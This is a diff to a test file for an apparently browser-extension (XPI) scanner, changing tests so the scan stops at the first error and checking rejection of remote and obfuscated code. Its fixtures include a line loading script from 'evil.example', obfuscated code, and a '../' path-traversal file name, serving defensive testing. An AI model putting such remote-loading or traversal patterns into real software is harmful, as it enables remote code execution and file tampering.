@@ -37,18 +37,15 @@ test("an extension without bootstrap.js or version bounds is rejected", () => {
 
 test("code from the internet and obfuscated code are rejected", () => {
   const obfuscated = Array.from({ length: 30 }, (_, i) => `var _0x${(0xa000 + i).toString(16)}=1;`).join("");
-  const result = inspectXpi(
-    xpi({
-      files: {
-        "content/load.js": 'Services.scriptloader.loadSubScript("https://evil.example/x.js", this);',
-        "content/page.xhtml": '<script src="https://cdn.example/lib.js"></script>',
-        "content/o.js": obfuscated,
-      },
-    }),
-    { listing: listing(), config },
-  );
-  assert.equal(result.ok, false);
-  assert.deepEqual(codes(result, "error").sort(), ["obfuscated", "remote-code", "remote-code"]);
+  for (const [file, text, code] of [
+    ["content/load.js", 'Services.scriptloader.loadSubScript("https://evil.example/x.js", this);', "remote-code"],
+    ["content/page.xhtml", '<script src="https://cdn.example/lib.js"></script>', "remote-code"],
+    ["content/o.js", obfuscated, "obfuscated"],
+  ]) {
+    const result = inspectXpi(xpi({ files: { [file]: text } }), { listing: listing(), config });
+    assert.equal(result.ok, false, file);
+    assert.deepEqual(codes(result, "error"), [code], file);
+  }
 });
 
 test("a script tag loading from the internet is found however it is written, and quickly", () => {
@@ -123,14 +120,18 @@ test("a version keeps a hundred web addresses and counts the rest", () => {
   assert.match(result.findings[0].message, / and 138 more\.$/);
 });
 
-test("findings are capped, and the file names they quote are cut short", () => {
+test("the scan stops at the first error, and the file names findings quote are cut short", () => {
+  // Each file of code costs time, and the version is refused anyway.
   const name = (i) => `content/${"n".repeat(300)}${i}.js`;
   const files = Object.fromEntries(Array.from({ length: 60 }, (_, i) => [name(i), 'import("https://example.com/x.js");']));
   const result = inspectXpi(xpi({ files }), { listing: listing(), config });
   assert.equal(result.ok, false);
-  assert.equal(result.findings.length, 50);
-  assert.deepEqual(result.findings[49], { level: "error", code: "more-findings", message: "And 11 more findings, not listed." });
-  assert.ok(result.findings.every((f) => f.message.length < 400));
+  assert.deepEqual(codes(result), ["remote-code"]);
+  assert.match(result.findings[0].message, /^content\/n{192}… loads code from the internet/);
+
+  // An error before the code is reached leaves all of it unread.
+  const early = inspectXpi(xpi({ files: { ...files, "bootstrap.js": null } }), { listing: listing(), config });
+  assert.deepEqual(codes(early), ["bootstrap-missing"]);
 
   // Names the ZIP reader quotes too
   const unsafe = inspectXpi(xpi({ files: { [`../${"x".repeat(1000)}`]: "x" } }), { listing: listing(), config });
